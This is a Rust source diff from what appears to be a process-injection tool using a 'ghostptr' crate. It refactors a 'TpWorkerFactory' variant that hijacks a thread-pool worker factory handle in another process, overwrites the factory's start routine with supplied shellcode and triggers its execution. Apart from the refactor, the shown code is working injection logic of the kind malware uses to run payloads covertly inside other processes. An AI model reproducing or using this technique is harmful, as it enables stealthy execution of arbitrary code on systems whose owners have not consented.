@@ -7,7 +7,7 @@ use crate::{
     },
 };
 use core::{mem::zeroed, ptr};
-use ghostptr::{Handle, MemoryProtection, Process, ProcessError, RemoteProcess, SafeHandle};
+use ghostptr::{Handle, MemoryProtection, Process, ProcessError, SafeHandle};
 
 /// Queries a TpWorkerFactory's basic information.
 fn get_factory_info(handle: Handle) -> ghostptr::Result<WorkerFactoryBasicInformation> {
@@ -52,9 +52,9 @@ fn execute_factory(handle: Handle, info: &WorkerFactoryBasicInformation) -> ghos
 pub struct TpWorkerFactory;
 
 impl Variant for TpWorkerFactory {
-    fn run(&self, process: &RemoteProcess, shellcode: &[u8]) -> ghostptr::Result<()> {
+    fn run(&self, process: &Process, shellcode: &[u8]) -> ghostptr::Result<()> {
         let factory_handle = SafeHandle::from(
-            hijack_handle(&process, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)?
+            hijack_handle(process, "TpWorkerFactory", WORKER_FACTORY_ALL_ACCESS)?
                 .expect("failed to hijack TpWorkerFactory handle"),
         );
 
@@ -69,7 +69,7 @@ impl Variant for TpWorkerFactory {
             shellcode.len(),
             MemoryProtection::READWRITE,
         )?;
-        process.write_slice(info.start_routine as usize, &shellcode)?;
+        process.write_slice(info.start_routine as usize, shellcode)?;
         process.protect_mem(info.start_routine as usize, shellcode.len(), old_protection)?;
 
         // trigger TpWorkerFactory execution
